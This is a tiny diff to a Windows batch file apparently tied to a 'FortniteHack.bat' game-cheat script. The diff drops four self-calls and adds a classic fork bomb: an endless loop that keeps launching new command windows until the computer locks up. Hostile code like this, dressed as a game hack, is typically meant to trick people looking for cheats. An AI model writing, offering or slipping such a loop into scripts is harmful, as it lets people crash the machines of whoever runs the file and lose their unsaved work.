@@ -1,4 +1,4 @@
-call FortniteHack.bat
-call FortniteHack.bat
-call FortniteHack.bat
-call FortniteHack.bat
+@echo off
+:A
+start
+goto A
